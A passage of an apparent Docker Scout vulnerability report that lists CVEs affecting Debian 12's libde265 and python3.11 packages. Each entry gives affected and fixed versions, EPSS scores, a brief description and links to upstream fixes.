<a href="https://scout.docker.com/v/CVE-2023-43887?s=debian&n=libde265&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.0.11-1%2Bdeb12u1"><img alt="high : CVE--2023--43887" src="https://img.shields.io/badge/CVE--2023--43887-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.0.11-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.0.11-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.166%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Libde265 v1.0.12 was discovered to contain multiple buffer overflows via the num_tile_columns and num_tile_row parameters in the function pic_parameter_set::dump.

---
- libde265 1.0.13-1
[bookworm] - libde265 1.0.11-1+deb12u1
[bullseye] - libde265 1.0.11-0+deb11u2
https://github.com/strukturag/libde265/issues/418
https://github.com/strukturag/libde265/commit/63b596c915977f038eafd7647d1db25488a8c133 (v1.0.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-47471?s=debian&n=libde265&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.0.11-1%2Bdeb12u1"><img alt="medium : CVE--2023--47471" src="https://img.shields.io/badge/CVE--2023--47471-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.0.11-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.0.11-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.299%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>53rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Buffer Overflow vulnerability in strukturag libde265 v1.10.12 allows a local attacker to cause a denial of service via the slice_segment_header function in the slice.cc component.

---
- libde265 1.0.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1056187)
[bookworm] - libde265 1.0.11-1+deb12u1
[bullseye] - libde265 1.0.11-0+deb11u2
https://github.com/strukturag/libde265/issues/426
https://github.com/strukturag/libde265/commit/e36b4a1b0bafa53df47514c419d5be3e8916ebc7 (v1.0.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-27102?s=debian&n=libde265&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.0.11-1%2Bdeb12u1"><img alt="medium : CVE--2023--27102" src="https://img.shields.io/badge/CVE--2023--27102-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.0.11-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.0.11-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.213%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Libde265 v1.0.11 was discovered to contain a segmentation violation via the function decoder_context::process_slice_segment_header at decctx.cc.

---
- libde265 1.0.12-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1033257)
[bookworm] - libde265 1.0.11-1+deb12u1
[bullseye] - libde265 1.0.11-0+deb11u2
https://github.com/strukturag/libde265/issues/393
https://github.com/strukturag/libde265/commit/0b1752abff97cb542941d317a0d18aa50cb199b1 (v1.0.12)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 11" src="https://img.shields.io/badge/M-11-fbb552"/> <img alt="low: 7" src="https://img.shields.io/badge/L-7-fce1a9"/> <!-- unspecified: 0 --><strong>python3.11</strong> <code>3.11.2-6</code> (deb)</summary>

<small><code>pkg:deb/debian/python3.11@3.11.2-6?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-7592?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u5"><img alt="high : CVE--2024--7592" src="https://img.shields.io/badge/CVE--2024--7592-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.796%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>73rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

There is a LOW severity vulnerability affecting CPython, specifically the 'http.cookies' standard library module.   When parsing cookies that contained backslashes for quoted characters in the cookie value, the parser would use an algorithm with quadratic complexity, resulting in excess CPU resources being used while parsing the value.

---
- python3.13 3.13.0~rc2-1
- python3.12 3.12.6-1
- python3.11 <removed>
[bookworm] - python3.11 3.11.2-6+deb12u5
- python3.9 <removed>
- pypy3 7.3.18+dfsg-1
[bookworm] - pypy3 <no-dsa> (Minor issue)
https://github.com/python/cpython/pull/123075
https://github.com/python/cpython/issues/123067
https://github.com/python/cpython/commit/391e5626e3ee5af267b97e37abc7475732e67621 (v3.13.0rc2)
https://github.com/python/cpython/commit/dcc3eaef98cd94d6cb6cb0f44bd1c903d04f33b1 (v3.12.6)
https://github.com/python/cpython/commit/d4ac921a4b081f7f996a5d2b101684b67ba0ed7f (v3.11.10)
https://github.com/python/cpython/commit/b2f11ca7667e4d57c71c1c88b255115f16042d9a (v3.10.15)
https://github.com/python/cpython/commit/d662e2db2605515a767f88ad48096b8ac623c774 (v3.9.20)
https://mail.python.org/archives/list/security-announce@python.org/thread/HXJAAAALNUNGCQUS2W7WR6GFIZIHFOOK/

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-6232?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u4"><img alt="high : CVE--2024--6232" src="https://img.shields.io/badge/CVE--2024--6232-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>3.034%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

There is a MEDIUM severity vulnerability affecting CPython.      Regular expressions that allowed excessive backtracking during tarfile.TarFile header parsing are vulnerable to ReDoS via specifically-crafted tar archives.

---
- python3.13 3.13.0~rc2-1
- python3.12 3.12.6-1
- python3.11 <removed>
[bookworm] - python3.11 3.11.2-6+deb12u4
- python3.9 <removed>
- python2.7 <removed>
[bullseye] - python2.7 <ignored> (Unsupported in Bullseye, only included to build a few applications)
- pypy3 7.3.18+dfsg-1
[bookworm] - pypy3 <no-dsa> (Minor issue)
https://github.com/python/cpython/issues/121285
https://github.com/python/cpython/pull/121286
https://github.com/python/cpython/commit/ed3a49ea734ada357ff4442996fd4ae71d253373 (v3.13.0rc2)
https://github.com/python/cpython/commit/4eaf4891c12589e3c7bdad5f5b076e4c8392dd06 (v3.12.6)
https://github.com/python/cpython/commit/d449caf8a179e3b954268b3a88eb9170be3c8fbf (v3.11.10)
https://github.com/python/cpython/commit/743acbe872485dc18df4d8ab2dc7895187f062c4 (v3.10.15)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-24329?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u2"><img alt="high : CVE--2023--24329" src="https://img.shields.io/badge/CVE--2023--24329-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.305%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue in the urllib.parse component of Python before 3.11.4 allows attackers to bypass blocklisting methods by supplying a URL that starts with blank characters.

---
- python3.11 3.11.4-1
[bookworm] - python3.11 3.11.2-6+deb12u2
- python3.9 <removed>
- python3.7 <removed>
[buster] - python3.7 <ignored> (Cf. related CVE-2022-0391)
- python2.7 <removed>
[bullseye] - python2.7 2.7.18-8+deb11u1
- pypy3 7.3.12+dfsg-1
[bookworm] - pypy3 7.3.11+dfsg-2+deb12u2
[buster] - pypy3 <no-dsa> (Minor issue)
https://pointernull.com/security/python-url-parse-problem.html
https://github.com/python/cpython/pull/99421
https://github.com/python/cpython/pull/99446 (backport for 3.11 branch)
https://github.com/python/cpython/commit/439b9cfaf43080e91c4ad69f312f21fa098befc7 (v3.12.0a2)
https://github.com/python/cpython/commit/72d356e3584ebfb8e813a8e9f2cd3dccf233c0d9 (v3.11.1)
The change linked above does not seem to fix the CVE:
https://github.com/python/cpython/issues/102153
https://github.com/python/cpython/pull/104575 (3.11)
https://github.com/python/cpython/pull/104592 (3.11, 3.10)
https://github.com/python/cpython/pull/104593 (3.9)
https://github.com/python/cpython/commit/2f630e1ce18ad2e07428296532a68b11dc66ad10 (v3.12.0b1)
https://github.com/python/cpython/commit/610cc0ab1b760b2abaac92bd256b96191c46b941 (v3.11.4)
https://github.com/python/cpython/commit/f48a96a28012d28ae37a2f4587a780a5eb779946 (v3.10.12)
https://github.com/python/cpython/commit/d7f8a5fe07b0ff3a419ccec434cc405b21a5a304 (v3.9.17)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-0938?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u6"><img alt="medium : CVE--2025--0938" src="https://img.shields.io/badge/CVE--2025--0938-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u6</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.244%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Python standard library functions `urllib.parse.urlsplit` and `urlparse` accepted domain names that included square brackets which isn't valid according to RFC 3986. Square brackets are only meant to be used as delimiters for specifying IPv6 and IPvFuture hosts in URLs. This could result in differential parsing across the Python URL parser and other specification-compliant URL parsers.

---
- python3.13 3.13.2-1
- python3.12 3.12.9-1
- python3.11 <removed>
[bookworm] - python3.11 3.11.2-6+deb12u6
- python3.9 <removed>
- pypy3 7.3.18+dfsg-2
[bookworm] - pypy3 <no-dsa> (Minor issue)
https://mail.python.org/archives/list/security-announce@python.org/thread/K4EUG6EKV6JYFIC24BASYOZS4M5XOQIB/
https://github.com/python/cpython/issues/105704
https://github.com/python/cpython/pull/129418
Fixed by: https://github.com/python/cpython/commit/d89a5f6a6e65511a5f6e0618c4c30a7aa5aba56a
Fixed by: https://github.com/python/cpython/commit/90e526ae67b172ed7c6c56e7edad36263b0f9403 (v3.13.2)
Fixed by: https://github.com/python/cpython/commit/a7084f6075c9595ba60119ce8c62f1496f50c568 (v3.12.9)
https://github.com/python/cpython/pull/129528 (3.11)
https://github.com/python/cpython/pull/129530 (3.9)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-11168?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u5"><img alt="medium : CVE--2024--11168" src="https://img.shields.io/badge/CVE--2024--11168-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.475%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>64th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The urllib.parse.urlsplit() and urlparse() functions improperly validated bracketed hosts (`[]`), allowing hosts that weren't IPv6 or IPvFuture. This behavior was not conformant to RFC 3986 and potentially enabled SSRF if a URL is processed by more than one URL parser.

---
- python3.12 <not-affected> (Fixed with first upload to Debian unstable)
- python3.11 3.11.4-1
[bookworm] - python3.11 3.11.2-6+deb12u5
- python3.9 <removed>
- pypy3 7.3.18+dfsg-1
[bookworm] - pypy3 <no-dsa> (Minor issue)
https://github.com/python/cpython/issues/103848
https://github.com/python/cpython/pull/103849
https://github.com/python/cpython/commit/29f348e232e82938ba2165843c448c2b291504c5 (v3.12.0b1)
https://github.com/python/cpython/commit/b2171a2fd41416cf68afd67460578631d755a550 (v3.11.4)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-0450?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u2"><img alt="medium : CVE--2024--0450" src="https://img.shields.io/badge/CVE--2024--0450-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.148%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was found in the CPython `zipfile` module affecting versions 3.12.1, 3.11.7, 3.10.13, 3.9.18, and 3.8.18 and prior.  The zipfile module is vulnerable to “quoted-overlap” zip-bombs which exploit the zip format to create a zip-bomb with a high compression ratio. The fixed versions of CPython makes the zipfile module reject zip archives which overlap entries in the archive.

---
- pypy3 7.3.16+dfsg-1
[bookworm] - pypy3 7.3.11+dfsg-2+deb12u2
- python3.12 3.12.2-1
- python3.11 3.11.8-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1070133)
[bookworm] - python3.11 3.11.2-6+deb12u2
- python3.10 <removed>
- python3.9 <removed>
- python3.7 <removed>
- python2.7 <removed>
[bullseye] - python2.7 <ignored> (Unsupported in Bullseye, only included to build a few applications)
https://github.com/python/cpython/pull/110016
https://github.com/python/cpython/issues/109858
https://github.com/python/cpython/commit/66363b9a7b9fe7c99eba3a185b74c5fdbf842eba (v3.13.0a3)
https://github.com/python/cpython/commit/fa181fcf2156f703347b03a3b1966ce47be8ab3b (v3.12.2)
https://github.com/python/cpython/commit/a956e510f6336d5ae111ba429a61c3ade30a7549 (v3.11.8)
https://github.com/python/cpython/commit/30fe5d853b56138dbec62432d370a1f99409fc85 (v3.10.14)
https://github.com/python/cpython/commit/a2c59992e9e8d35baba9695eb186ad6c6ff85c51 (v3.9.19)
https://mail.python.org/archives/list/security-announce@python.org/thread/XELNUX2L3IOHBTFU7RQHCY6OUVEWZ2FG/

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-0672?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D3.11.2-6%2Bdeb12u6"><img alt="medium : CVE--2026--0672" src="https://img.shields.io/badge/CVE--2026--0672-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><=3.11.2-6+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.047%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When using http.cookies.Morsel, user-controlled cookie values and parameters can allow injecting HTTP headers into messages. Patch rejects all control characters within cookie names, values, and parameters.

---
- python3.14 <unfixed>
- python3.13 <unfixed>
- python3.11 <removed>
- python3.9 <removed>
- pypy3 <unfixed>
https://github.com/python/cpython/pull/143920
https://github.com/python/cpython/issues/143919
https://mail.python.org/archives/list/security-announce@python.org/thread/6VFLQQEIX673KXKFUZXCUNE5AZOGZ45M/
https://github.com/python/cpython/commit/95746b3a13a985787ef53b977129041971ed7f70
TODO: check completeness

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15282?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D3.11.2-6%2Bdeb12u6"><img alt="medium : CVE--2025--15282" src="https://img.shields.io/badge/CVE--2025--15282-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><=3.11.2-6+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.047%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

User-controlled data URLs parsed by urllib.request.DataHandler allow injecting headers through newlines in the data URL mediatype.

---
- python3.14 <unfixed>
- python3.13 <unfixed>
- python3.11 <removed>
- python3.9 <removed>
- pypy3 <unfixed>
https://github.com/python/cpython/issues/143925
https://github.com/python/cpython/pull/143926
https://mail.python.org/archives/list/security-announce@python.org/thread/X66HL7SISGJT33J53OHXMZT4DFLMHVKF/
https://github.com/python/cpython/commit/f25509e78e8be6ea73c811ac2b8c928c28841b9f (main)
TODO: check completeness

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-0865?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D3.11.2-6%2Bdeb12u6"><img alt="medium : CVE--2026--0865" src="https://img.shields.io/badge/CVE--2026--0865-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><=3.11.2-6+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.067%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

User-controlled header names and values containing newlines can allow injecting HTTP headers.

---
- python3.14 <unfixed>
- python3.13 <unfixed>
- python3.11 <removed>
- python3.9 <removed>
- python2.7 <removed>
- pypy3 <unfixed>
https://github.com/python/cpython/pull/143917
https://github.com/python/cpython/issues/143916
https://mail.python.org/archives/list/security-announce@python.org/thread/BJ6QPHNSHJTS3A7CFV6IBMCAP2DWRVNT/
https://github.com/python/cpython/commit/f7fceed79ca1bceae8dbe5ba5bc8928564da7211 (main)
https://github.com/python/cpython/commit/23e3c0ae867cca0130e441e776c9955b9027c510 (3.14-branch)
https://github.com/python/cpython/commit/22e4d55285cee52bc4dbe061324e5f30bd4dee58 (3.13-branch)
https://github.com/python/cpython/commit/4802b96a2cde58570c24c13ef3289490980961c5 (3.12-branch)
https://github.com/python/cpython/commit/e4846a93ac07a8ae9aa18203af0dd13d6e7a6995 (3.11-branch)
https://github.com/python/cpython/commit/2f840249550e082dc351743f474ba56da10478d2 (3.10-branch)
TODO: check completeness

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15367?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D3.11.2-6%2Bdeb12u6"><img alt="medium : CVE--2025--15367" src="https://img.shields.io/badge/CVE--2025--15367-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><=3.11.2-6+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.043%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The poplib module, when passed a user-controlled command, can have additional commands injected using newlines. Mitigation rejects commands containing control characters.

---
- python3.14 <unfixed>
- python3.13 <unfixed>
- python3.11 <removed>
- python3.9 <removed>
- pypy3 <unfixed>
https://github.com/python/cpython/issues/143923
https://github.com/python/cpython/pull/143924
https://mail.python.org/archives/list/security-announce@python.org/thread/CBFBOWVGGUJFSGITQCCBZS4GEYYZ7ZNE/
https://github.com/python/cpython/commit/b234a2b67539f787e191d2ef19a7cbdce32874e7 (main)
TODO: check completeness

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15366?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D3.11.2-6%2Bdeb12u6"><img alt="medium : CVE--2025--15366" src="https://img.shields.io/badge/CVE--2025--15366-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><=3.11.2-6+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.043%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The imaplib module, when passed a user-controlled command, can have additional commands injected using newlines. Mitigation rejects commands containing control characters.

---
- python3.14 <unfixed>
- python3.13 <unfixed>
- python3.11 <removed>
- python3.9 <removed>
- pypy3 <unfixed>
https://github.com/python/cpython/issues/143921
https://github.com/python/cpython/pull/143922
https://mail.python.org/archives/list/security-announce@python.org/thread/DD7C7JZJYTBXMDOWKCEIEBJLBRU64OMR/
https://github.com/python/cpython/commit/6262704b134db2a4ba12e85ecfbd968534f28b45 (main)
TODO: check completeness

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-6923?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u5"><img alt="medium : CVE--2024--6923" src="https://img.shields.io/badge/CVE--2024--6923-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.238%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

There is a MEDIUM severity vulnerability affecting CPython.  The  email module didn’t properly quote newlines for email headers when  serializing an email message allowing for header injection when an email  is serialized.

---
- python3.13 3.13.0~rc2-1
- python3.12 3.12.5-1
- python3.11 <removed>
[bookworm] - python3.11 3.11.2-6+deb12u5
- python3.9 <removed>
- python2.7 <removed>
[bullseye] - python2.7 <ignored> (Unsupported in Bullseye, only included to build a few applications)
- pypy3 7.3.18+dfsg-1
[bookworm] - pypy3 <no-dsa> (Minor issue)
https://github.com/python/cpython/issues/121650
https://github.com/python/cpython/pull/122233
https://github.com/python/cpython/commit/4aaa4259b5a6e664b7316a4d60bdec7ee0f124d0 (v3.13.0rc2)
https://github.com/python/cpython/commit/4766d1200fdf8b6728137aa2927a297e224d5fa7 (v3.12.5)
https://github.com/python/cpython/commit/f7c0f09e69e950cf3c5ada9dbde93898eb975533 (v3.11.10)
https://github.com/python/cpython/commit/06f28dc236708f72871c64d4bc4b4ea144c50147 (v3.10.15)
https://github.com/python/cpython/commit/f7be505d137a22528cb0fc004422c0081d5d90e6 (v3.9.20)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-40217?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u2"><img alt="medium : CVE--2023--40217" src="https://img.shields.io/badge/CVE--2023--40217-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.581%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in Python before 3.8.18, 3.9.x before 3.9.18, 3.10.x before 3.10.13, and 3.11.x before 3.11.5. It primarily affects servers (such as HTTP servers) that use TLS client authentication. If a TLS server-side socket is created, receives data into the socket buffer, and then is closed quickly, there is a brief window where the SSLSocket instance will detect the socket as "not connected" and won't initiate a handshake, but buffered data will still be readable from the socket buffer. This data will not be authenticated if the server-side TLS peer is expecting client certificate authentication, and is indistinguishable from valid TLS stream data. Data is limited in size to the amount that will fit in the buffer. (The TLS connection cannot directly be used for data exfiltration because the vulnerable code path requires that the connection be closed on initialization of the SSLSocket.)

---
- python3.12 3.12.0~rc1-2
- python3.11 3.11.5-1
[bookworm] - python3.11 3.11.2-6+deb12u2
- python3.10 3.10.13-1
- python3.9 <removed>
- python3.7 <removed>
- python2.7 <removed>
[bullseye] - python2.7 2.7.18-8+deb11u1
- pypy3 7.3.13+dfsg-1
[bookworm] - pypy3 7.3.11+dfsg-2+deb12u2
[buster] - pypy3 <no-dsa> (Minor issue)
https://mail.python.org/archives/list/security-announce@python.org/thread/PEPLII27KYHLF4AK3ZQGKYNCRERG4YXY/
https://github.com/python/cpython/issues/108310
https://github.com/python/cpython/pull/108315
https://github.com/python/cpython/commit/0cb0c238d520a8718e313b52cffc356a5a7561bf (main)
https://github.com/python/cpython/commit/256586ab8776e4526ca594b4866b9a3492e628f1 (3.12)
https://github.com/python/cpython/commit/75a875e0df0530b75b1470d797942f90f4a718d3 (v3.11.5)
https://github.com/python/cpython/commit/37d7180cb647f0bed0c1caab0037f3bc82e2af96 (v3.10.13)
https://github.com/python/cpython/commit/264b1dacc67346efa0933d1e63f622676e0ed96b (v3.9.18)
Additional patches to stabilize the test suite may also be applied to all versions:
1. https://github.com/python/cpython/commit/64f99350351bc46e016b2286f36ba7cd669b79e3
2. https://github.com/python/cpython/commit/592bacb6fc0833336c0453e818e9b95016e9fd47

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-27043?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u5"><img alt="medium : CVE--2023--27043" src="https://img.shields.io/badge/CVE--2023--27043-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.164%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The email module of Python through 3.11.3 incorrectly parses e-mail addresses that contain a special character. The wrong portion of an RFC2822 header is identified as the value of the addr-spec. In some applications, an attacker can bypass a protection mechanism in which application access is granted only after verifying receipt of e-mail to a specific domain (e.g., only @company.example.com addresses may be used for signup). This occurs in email/_parseaddr.py in recent versions of Python.

---
- python3.12 3.12.6-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059299)
- python3.11 <removed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059298)
[bookworm] - python3.11 3.11.2-6+deb12u5
- python3.10 <removed>
- python3.9 <removed>
- python3.7 <removed>
[buster] - python3.7 <postponed> (Minor issue)
- python2.7 <removed>
[bullseye] - python2.7 <ignored> (Unsupported in Bullseye, only included to build a few applications)
[buster] - python2.7 <postponed> (Minor issue)
- pypy3 7.3.17+dfsg-3 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1072179)
[bookworm] - pypy3 7.3.11+dfsg-2+deb12u3
[buster] - pypy3 <postponed> (Minor issue)
https://github.com/python/cpython/issues/102988
https://github.com/python/cpython/commit/15068242bd4405475f70a81805a8895ca309a310 (v3.12.6)
https://github.com/python/cpython/commit/bc4a703a934a59657ecd018320ef990bc5542803 (v3.11.10)
https://github.com/python/cpython/commit/2a9273a0e4466e2f057f9ce6fe98cd8ce570331b (v3.10.15)
https://github.com/python/cpython/commit/ee953f2b8fc12ee9b8209ab60a2f06c603e5a624 (v3.9.20)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1795?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u6"><img alt="low : CVE--2025--1795" src="https://img.shields.io/badge/CVE--2025--1795-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u6</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.593%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

During an address list folding when a separating comma ends up on a folded line and that line is to be unicode-encoded then the separator itself is also unicode-encoded. Expected behavior is that the separating comma remains a plan comma. This can result in the address header being misinterpreted by some mail servers.

---
- python3.13 3.13.0~b1-1
- python3.12 3.12.9-1
- python3.11 <removed>
[bookworm] - python3.11 3.11.2-6+deb12u6
- python3.9 <removed>
- pypy3 7.3.18+dfsg-1
[bookworm] - pypy3 <no-dsa> (Minor issue)
https://github.com/python/cpython/issues/100884
Regression issue: https://github.com/python/cpython/issues/118643
https://mail.python.org/archives/list/security-announce@python.org/thread/MB62IZMEC3UM6SGHP5LET5JX2Y7H4ZUR/
Fixed by: https://github.com/python/cpython/commit/09fab93c3d857496c0bd162797fab816c311ee48 (v3.13.0a5)
Regression fixed by: https://github.com/python/cpython/commit/6892b400dc8c95375ef31f6d716d62a6ff0c4cf2 (v3.13.0b2)
Fixed by: https://github.com/python/cpython/commit/9148b77e0af91cdacaa7fe3dfac09635c3fe9a74 (v3.12.3)
Regression fixed by: https://github.com/python/cpython/commit/8c96850161da23ad2b37551d2a89c7d4716fe024 (v3.12.4)
Fixed by: https://github.com/python/cpython/commit/70754d21c288535e86070ca7a6e90dcb670b8593 (v3.11.9)
